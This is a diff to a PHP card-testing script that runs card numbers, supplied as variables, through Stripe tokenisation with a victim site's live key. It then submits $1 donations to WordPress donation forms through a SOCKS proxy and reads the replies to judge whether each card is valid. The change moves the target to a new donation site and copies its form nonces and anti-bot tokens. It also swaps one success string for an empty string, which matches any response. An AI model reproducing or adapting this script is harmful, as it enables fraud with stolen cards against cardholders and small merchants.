@@ -348,7 +348,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=1a2036d8-dd8d-412d-9dce-0aafd6638ccb82c672&sid=a22fdde9-f45b-4f83-80f9-1eae37e04eaca8a5b6&pasted_fields=number&payment_user_agent=stripe.js%2F5ce6030bc3%3B+stripe-js-v3%2F5ce6030bc3%3B+card-element&referrer=https%3A%2F%2Fwww.barbieangell.com&time_on_page=38927&key=pk_live_51GYElZAnp6pksGGxteKCy8DKig4ZooMpuWLCfXeOBj852XMZoJSXQGZjbiq9OXfiRsirgc7VJEFYf2vGJ4A1GHFt00LOZvKRd3&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYnEK1Qhg4d86XRAbTfjkDAZmPAvgIF7cGQkcAHhjC9i9vel2i8vSq4-Qs2X-m-beGXrY5uxGMxYd7KtzNf_cdSjwhXpkWlq7VQhgjD6UzwSfPqI6of4JkwY6J62dQchtYaNWuxQNZwsmSfcpxJYKEDnzgnPm00eBQZc_QdOyRr_ggwXGsd2BeRroYAoNvKr-WNDnrgz1Gg2J80w8S28uUMK2aqG0WwAxnIEfEzNYcbma9wWsuelizslT0HxAT0fCfY9Bb4L_sjyQBCQhaEUhQ-LeEfrVs43tiD79YoRQPDDZsz1Ag6n4-E18TjTmK-m0wby-um3xr13Vny3YMF7n5S8eOY3EvFOHsJcKs2-xcj8sLQeNg_2aWiSwYpbibQRfMAbK4IgLkwWznGBiitv9V6LC8OvJ7DQC_etYDuoZUikDV3ZkJn9VAuYtuLvC0ogxMSxqsVxGoeFhZ6E8N-axLhQ9cF8csGKT5Dz0cU7MEeZcHDvvuJc8RqfcpR4Yx-ERTSEseDVi9-RiY0tFmIv9Z22kesheOwf2ma_nkjx8D0MK7jyY-G8-iaqM4NvP55lbchDSOaL8GBJtv5YLtKYVYQWbEliezUu5s9EmS9bvaJ_xnin7WfuUjCvu9aHRUMfF9A_Dy77bDX422RsN69--qti8ImFW2e7rT1GFC6BRvwRm9uyF2dP1NGXww4BzI2w9HGsKP-fNLB-GoL1jY0J5iktV-sbh1lB7tDxcMJHROaqNh2x0LPh0i_sQw5o0sRVRHML6SV1AarHXVsPGiXKEWUVRG_OooLF9373GUxdam00gkOwvGSu1u4IxEvAXGZ8iN__2d8jhfWPGnawPyOz2YzWR9LHQZjAjAaU5H9yQ1SoAj-yyxEjTq5I1NEoom2Ui4Qhj4ffFKQyG2uqoOZJELP96ITtXGZNoiQxfUET9DPZAUGhjS_GYaGT6D8PLRbngEkifI1yzgEwjMjM_Pdv-0mKRfvQUsPBU8LVIGmGKZA59uka7zucdG3S7atDzj32SPrZN_Agvsv5IFFyFja3sTs05OHn_NbWyRfDJ2Y6ZGlUKWQ-RCDFL9D3kLB7CtqP2QAxkEzzAxVNLsNVkfQIqBQlt05RiDOOULmkdEn6XLel-5HbqxOwJmnhExcOUgsYI-mMkWZxqr5yPp7kVg5JK40usIZ3bxXGDLTEFMa8PRdndOlKnRscOmRBFygcUW79lcEi1Sza-6H9QCElyZStyWaEn5YgPdINLKi7AZXjotPRVSRNX1V1Jc0lj8-XgTw42c3A86eeC3ePA_8lnDnJN5KjpiUJHdP-uKf6Dqj-dVoxKfsfDZkX2zudvu9-xfy-18UB-tv6AJcLFBR99ggYy9Xy4r_h0xASjfStamVM0KeWp6yDgJ4UbZ2z6dAL49Un7lqrEswehV95BCb89FIGjewjdk72rF75tpL3keWl4LGLhKzMQjcnF3C8z3AX-WD8_hSLmPb5m_b_oc8kQ1iwf1oucwMzBqP3-j_OOS5YqfM0Zl9DGVK7rFpJVUKwpCbnHFmSR5-cLhHwIGRXZP5Cv-AEdq-pkSAfCuFzk7MNELCc2IfV6Kum2cvzGVaFcJ_HEjuEmdyY-uGG5P6p0kovSQjXvjfpgUyQaEL-g4blcXHv-GBbUPLDW2I-5xOmPyJlrckeZIE5g2IIclgbah3DwiJ4BJW90UVwJRmy1EpolG-fprQS3WF5K2Jk0JdMAJE2SQqckX6yY5W-HGzh2DTsJYgXh-mPXs1MqKCHG5ilcCYktHGGvzYqXDKr5NbZTdbjPuW4ZSVlxHJNpJH1RPTwu1-HNUZdqLnxqxSPP5SIQUVwm-8U7WcYiJbpANhkmzhXQRqgofGJKkSk2tfqxc8ZU3nmzmBgoyZf9rdi4Ml-JImD1CPJxyvKjmbMlncnRs2SWQxytMXwVG07NjwB2CPyRRpyVFpOFEzNrq12iVAiHLlRt8MmMiw6bCm56h11vMHuvx-9Yuuvk5ToXNnuVnHMTu1QEDWBU3wVozQCaqe-VVbB4N0YFwf3H42pqsvRL0ZaebQzuZ5V4KaA1J8zo0Wiay3lcEtwPH1joQyQKs2wCn2ztQA6d2sOUcfo2V4cM5mBnatqHNoYXJkX2lkzhWZ5FSia3KoNDc0YTEzY2OicGQA.RuEPnyCJURG2RMB16KtNA1svD7PnAa48PfaJoZqevvk');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=9d9c4264-4c31-4c8a-a72a-2ba669427656adcd18&sid=be2457e4-bbd6-44d3-a81c-6eabc15a78c09bf72a&pasted_fields=number&payment_user_agent=stripe.js%2F7f87617255%3B+stripe-js-v3%2F7f87617255%3B+card-element&referrer=https%3A%2F%2Fvoxel.guide&time_on_page=43023&key=pk_live_51NpwDuJJGU2OiPGJMg81F7vHVBhBfXEa9mIYDKKXzcMyrXj5sCu7v2SaHVV1wgAGC3Rqyyy5UFieTsOcngiuzE1H00R0fEcFLm');
 
 
 
@@ -359,7 +359,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, 'https://www.barbieangell.com/wp-admin/admin-ajax.php?t=1711699544742');
+curl_setopt($ch, CURLOPT_URL, 'https://voxel.guide/wp-admin/admin-ajax.php?t=1712301129552');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -370,22 +370,22 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'POST /wp-admin/admin-ajax.php?t=1711699544742 h2',
-'Host: www.barbieangell.com',
+'POST /wp-admin/admin-ajax.php?t=1712301129552 h2',
+'Host: voxel.guide',
 'accept: */*',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-'origin: https://www.barbieangell.com',
+'origin: https://voxel.guide',
 'sec-fetch-site: same-origin',
 'sec-fetch-mode: cors',
 'sec-fetch-dest: empty',
-'referer: https://www.barbieangell.com/donate/',
+'referer: https://voxel.guide/donate/',
 'accept-language: en-US,en;q=0.9',
    ));
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D3074%26_fluentform_4_fluentformnonce%3D268028a3a1%26_wp_http_referer%3D%252Fdonate%252F%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26email%3Dgloosmoke%2540gmail.com%26custom-payment-amount%3D1%26payment_method%3Dstripe%26acknowledge_amount%3Don%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=4');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D1499%26_fluentform_3_fluentformnonce%3D3192d9ee41%26_wp_http_referer%3D%252Fdonate%252F%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26email%3Dgloosmoke%2540gmail.com%26payment_input%3DOther%26custom-payment-amount%3D1%26payment_method%3Dstripe%26gdpr-agreement%3Don%26ct_bot_detector_event_token%3D6d19867aab4bfd71bd0fed20be7ccbb93ee2fb912f4c7278002d8fefc4a790f2%26apbct_visible_fields%3DeyIwIjp7InZpc2libGVfZmllbGRzIjoibmFtZXNbZmlyc3RfbmFtZV0gbmFtZXNbbGFzdF9uYW1lXSBlbWFpbCBjdXN0b20tcGF5bWVudC1hbW91bnQiLCJ2aXNpYmxlX2ZpZWxkc19jb3VudCI6NCwiaW52aXNpYmxlX2ZpZWxkcyI6Il9fZmx1ZW50X2Zvcm1fZW1iZGVkX3Bvc3RfaWQgX2ZsdWVudGZvcm1fM19mbHVlbnRmb3Jtbm9uY2UgX3dwX2h0dHBfcmVmZXJlciBwYXltZW50X21ldGhvZCBjdF9ib3RfZGV0ZWN0b3JfZXZlbnRfdG9rZW4gY3Rfbm9fY29va2llX2hpZGRlbl9maWVsZCIsImludmlzaWJsZV9maWVsZHNfY291bnQiOjZ9fQ%253D%253D%26__entry_intermediate_hash%3D2bce0e203742c6973fcf6b9b8e87577d%26ct_no_cookie_hidden_field%3D_ct_no_cookie_data_eyJjdF9tb3VzZV9tb3ZlZCI6dHJ1ZSwiYXBiY3RfdXJscyI6IntcInZveGVsLmd1aWRlL2RvbmF0ZS9cIjpbMTcxMjMwMTAzMl19IiwiY3RfaGFzX3Njcm9sbGVkIjp0cnVlLCJjdF9jb29raWVzX3R5cGUiOiJub25lIiwiYXBiY3RfaGVhZGxlc3MiOiJmYWxzZSIsImFwYmN0X3Zpc2libGVfZmllbGRzIjoiJTdCJTIydmlzaWJsZV9maWVsZHMlMjIlM0ElMjJuYW1lcyU1QmZpcnN0X25hbWUlNUQlMjBuYW1lcyU1Qmxhc3RfbmFtZSU1RCUyMGVtYWlsJTIwY3VzdG9tLXBheW1lbnQtYW1vdW50JTIyJTJDJTIydmlzaWJsZV9maWVsZHNfY291bnQlMjIlM0E0JTJDJTIyaW52aXNpYmxlX2ZpZWxkcyUyMiUzQSUyMl9fZmx1ZW50X2Zvcm1fZW1iZGVkX3Bvc3RfaWQlMjBfZmx1ZW50Zm9ybV8zX2ZsdWVudGZvcm1ub25jZSUyMF93cF9odHRwX3JlZmVyZXIlMjBwYXltZW50X21ldGhvZCUyMGN0X2JvdF9kZXRlY3Rvcl9ldmVudF90b2tlbiUyMGFwYmN0X3Zpc2libGVfZmllbGRzJTIwX19lbnRyeV9pbnRlcm1lZGlhdGVfaGFzaCUyMGN0X25vX2Nvb2tpZV9oaWRkZW5fZmllbGQlMjIlMkMlMjJpbnZpc2libGVfZmllbGRzX2NvdW50JTIyJTNBOCU3RCIsImN0X2ZrcF90aW1lc3RhbXAiOiIxNzEyMzAxMDM2IiwiY3Rfc2NyZWVuX2luZm8iOiIlN0IlMjJmdWxsV2lkdGglMjIlM0EzOTMlMkMlMjJmdWxsSGVpZ2h0JTIyJTNBMTMyMCUyQyUyMnZpc2libGVXaWR0aCUyMiUzQTM5MyUyQyUyMnZpc2libGVIZWlnaHQlMjIlM0E3NDMlN0QiLCJjdF9jaGVja2pzIjoiMTIwNjI2MjUwMyIsImN0X3RpbWV6b25lIjoiNyIsImFwYmN0X3BpeGVsX3VybCI6Imh0dHBzJTNBJTJGJTJGbW9kZXJhdGUyLXY0LmNsZWFudGFsay5vcmclMkZwaXhlbCUyRjM2ZWI4MGU5NDEyNTdlYTc4ZTNmMDE5YWE3MDJkM2IxLmdpZiIsImN0X2NoZWNrZWRfZW1haWxzIjoiJTdCJTIyZ2xvb3Ntb2tlJTQwZ21haWwuY29tJTIyJTNBJTdCJTIycmVzdWx0JTIyJTNBJTIyQ0FDSEVEJTIyJTJDJTIydGltZXN0YW1wJTIyJTNBMTcxMjMwMTA0MyU3RCU3RCIsImN0X2hhc19rZXlfdXAiOiJ0cnVlIiwiY3RfcHNfdGltZXN0YW1wIjoiMTcxMjMwMTAzNiIsImFwYmN0X3BhZ2VfaGl0cyI6MiwiY3RfaGFzX2lucHV0X2ZvY3VzZWQiOiJ0cnVlIiwiYXBiY3Rfc2l0ZV9sYW5kaW5nX3RzIjoiMTcxMjMwMTAzMiIsImFwYmN0X2Nvb2tpZXNfdGVzdCI6IiU3QiUyMmNvb2tpZXNfbmFtZXMlMjIlM0ElNUIlMjJhcGJjdF90aW1lc3RhbXAlMjIlMkMlMjJhcGJjdF9zaXRlX2xhbmRpbmdfdHMlMjIlNUQlMkMlMjJjaGVja192YWx1ZSUyMiUzQSUyMmZiM2ExNTk3ZTU1ZTM0ZjBjOGIyNGEwZDQyMDkyYTM1JTIyJTdEIiwiY3RfcG9pbnRlcl9kYXRhIjoiJTVCJTVCMzgyJTJDMjgwJTJDMTUzNyU1RCUyQyU1QjQ2MCUyQzE2MiUyQzMxODklNUQlMkMlNUIyODQlMkMyMjQlMkM0NTcwJTVEJTJDJTVCNTI1JTJDMjI1JTJDNjA0MiU1RCUyQyU1QjYwMCUyQzE5NCUyQzcwMDAlNUQlMkMlNUIxNzUlMkM0OSUyQzk3NjElNUQlMkMlNUIyNjclMkM0NSUyQzI2NjAwJTVEJTJDJTVCNTI1JTJDMzAwJTJDNDM3NDElNUQlNUQiLCJhcGJjdF9pZnJhbWVzX3Byb3RlY3RlZCI6W10sImFwYmN0X3Nlc3Npb25faWQiOiJqYWRnaXJmciIsImFwYmN0X3NpdGVfcmVmZXJlciI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwiYXBiY3Rfc2Vzc2lvbl9jdXJyZW50X3BhZ2UiOiJodHRwczovL3ZveGVsLmd1aWRlL2RvbmF0ZS8iLCJ0eXBvIjpbXX0%253D%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=3');
 
 
 $result2 = curl_exec($ch);
@@ -408,7 +408,7 @@ if (
     strpos($result2, "Thank you for becoming a member") !== false ||
     strpos($result2, 'Membership confirmed.') !== false ||
     strpos($result2, 'Membership Confirmation') !== false ||
-    strpos($result2, 'Thank you for your donation! You will receive an email confirmation shortly') !== false ||
+    strpos($result2, '') !== false ||
     strpos($result2, 'incorrect_zip') !== false ||
     strpos($result2, 'Success ') !== false ||
     strpos($result2, '"type":"one-time"') !== false ||
